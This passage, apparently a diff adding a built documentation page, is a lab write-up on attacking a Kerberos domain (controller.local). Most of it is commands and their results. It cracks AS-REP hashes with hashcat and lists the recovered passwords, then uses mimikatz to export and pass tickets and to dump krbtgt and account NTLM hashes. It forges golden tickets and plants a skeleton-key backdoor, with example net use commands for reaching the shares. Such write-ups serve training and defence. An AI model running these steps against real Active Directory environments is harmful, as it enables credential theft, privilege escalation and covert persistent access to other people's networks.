+<div class="highlight"><pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">18200</span><span class="w"> </span>-a<span class="w"> </span><span class="m">0</span><span class="w"> </span>hash_admin2.txt<span class="w"> </span>passwords.txt<span class="w">  </span>
+</code></pre></div>
+<p><img alt="alt text" src="image-5.png" /></p>
+<div class="highlight"><pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">18200</span><span class="w"> </span>-a<span class="w"> </span><span class="m">0</span><span class="w"> </span>hash_user3.txt<span class="w"> </span>passwords.txt
+</code></pre></div>
+<p><img alt="alt text" src="image-6.png" /></p>
+<table>
+<thead>
+<tr>
+<th>User</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Admin2</td>
+<td>P@SSW0rd2</td>
+</tr>
+<tr>
+<td>User3</td>
+<td>Password3</td>
+</tr>
+</tbody>
+</table>
+<h3 id="mimikatz">Mimikatz<a class="headerlink" href="#mimikatz" title="Permanent link">&para;</a></h3>
+<p>Pass the Ticket w/ mimikatz</p>
+<div class="highlight"><pre><span></span><code><span class="p">.\</span><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span>
+
+<span class="n">mimikatz</span> <span class="c"># privilege::debug</span>
+
+<span class="n">mimikatz</span> <span class="c"># sekurlsa::tickets /export</span>
+</code></pre></div>
+<p><img alt="alt text" src="image-7.png" /></p>
+<p><img alt="alt text" src="image-8.png" /></p>
+<div class="highlight"><pre><span></span><code>mimikatz<span class="w"> </span><span class="c1"># kerberos::ptt [0;7fbb3]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi</span>
+</code></pre></div>
+<p><img alt="alt text" src="image-9.png" /></p>
+<p><img alt="alt text" src="image-10.png" /></p>
+<div class="highlight"><pre><span></span><code><span class="nb">dir </span><span class="p">\\</span><span class="n">10</span><span class="p">.</span><span class="n">201</span><span class="p">.</span><span class="n">99</span><span class="p">.</span><span class="n">85</span><span class="p">\</span><span class="n">admin</span><span class="p">$</span>
+</code></pre></div>
+<p><img alt="alt text" src="image-11.png" /></p>
+<p>Golden/Silver Ticket Attacks w/ mimikatz</p>
+<div class="highlight"><pre><span></span><code><span class="p">.\</span><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span>
+
+<span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>
+
+<span class="n">lsadump</span><span class="p">::</span><span class="n">lsa</span> <span class="p">/</span><span class="n">inject</span> <span class="p">/</span><span class="n">name</span><span class="p">:</span><span class="n">krbtgt</span>
+</code></pre></div>
+<p><img alt="alt text" src="image-12.png" /></p>
+<p>Guardamos el SID y el NTLM</p>
+<div class="highlight"><pre><span></span><code>/sid:<span class="w"> </span>S-1-5-21-432953485-3795405108-1502158860
+/krbtgt:<span class="w"> </span>72cd714611b64cd4d5550cd2759db3f6
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="n">kerberos</span><span class="p">::</span><span class="n">golden</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">controller</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">sid</span><span class="p">:</span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">432953485</span><span class="p">-</span><span class="n">3795405108</span><span class="p">-</span><span class="n">1502158860</span> <span class="p">/</span><span class="n">krbtgt</span><span class="p">:</span><span class="n">72cd714611b64cd4d5550cd2759db3f6</span> <span class="p">/</span><span class="n">id</span><span class="p">:</span><span class="n">500</span>
+</code></pre></div>
+<p><img alt="alt text" src="image-13.png" /></p>
+<div class="highlight"><pre><span></span><code><span class="n">misc</span><span class="p">::</span><span class="n">cmd</span>
+</code></pre></div>
+<p><img alt="alt text" src="image-14.png" /></p>
+<div class="highlight"><pre><span></span><code><span class="n">lsadump</span><span class="p">::</span><span class="n">lsa</span> <span class="p">/</span><span class="n">inject</span> <span class="p">/</span><span class="n">name</span><span class="p">:</span><span class="n">administrator</span>
+<span class="n">Domain</span> <span class="p">:</span> <span class="n">CONTROLLER</span> <span class="p">/</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">432953485</span><span class="p">-</span><span class="n">3795405108</span><span class="p">-</span><span class="n">1502158860</span>
+<span class="n">NTLM</span> <span class="p">:</span> <span class="n">2777b7fec870e04dda00cd7260f7bee6</span>
+
+<span class="n">lsadump</span><span class="p">::</span><span class="n">lsa</span> <span class="p">/</span><span class="n">inject</span> <span class="p">/</span><span class="n">name</span><span class="p">:</span><span class="n">sqlservice</span>
+<span class="n">Domain</span> <span class="p">:</span> <span class="n">CONTROLLER</span> <span class="p">/</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">432953485</span><span class="p">-</span><span class="n">3795405108</span><span class="p">-</span><span class="n">1502158860</span>
+<span class="n">NTLM</span> <span class="p">:</span> <span class="n">cd40c9ed96265531b21fc5b1dafcfb0a</span>
+</code></pre></div>
+<p><img alt="alt text" src="image-15.png" /></p>
+<p><img alt="alt text" src="image-16.png" /></p>
+<div class="highlight"><pre><span></span><code><span class="n">kerberos</span><span class="p">::</span><span class="n">golden</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">controller</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">sid</span><span class="p">:</span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">432953485</span><span class="p">-</span><span class="n">3795405108</span><span class="p">-</span><span class="n">1502158860</span> <span class="p">/</span><span class="n">krbtgt</span><span class="p">:</span><span class="n">2777b7fec870e04dda00cd7260f7bee6</span> <span class="p">/</span><span class="n">id</span><span class="p">:</span><span class="n">500</span>
+</code></pre></div>
+<p><img alt="alt text" src="image-17.png" /></p>
+<p>Kerberos Backdoors w/ mimikatz</p>
+<div class="highlight"><pre><span></span><code><span class="p">.\</span><span class="n">Mimikatz</span><span class="p">.</span><span class="n">exe</span>
+
+<span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>
+
+<span class="n">misc</span><span class="p">::</span><span class="n">skeleton</span>
+</code></pre></div>
+<p><img alt="alt text" src="image-18.png" /></p>
+<p>Accessing the forest - </p>
+<p>The default credentials will be: "<em>mimikatz</em>"  </p>
+<p>example: <code>net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz</code> - The share will now be accessible without the need for the Administrators password</p>
+<p>example: <code>dir \\Desktop-1\c$ /user:Machine1 mimikatz</code> - access the directory of Desktop-1 without ever knowing what users have access to Desktop-1</p>
+<p>The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques however that is out of scope for this room.</p>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.sections", "navigation.expand", "navigation.path", "content.code.copy", "search.highlight"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
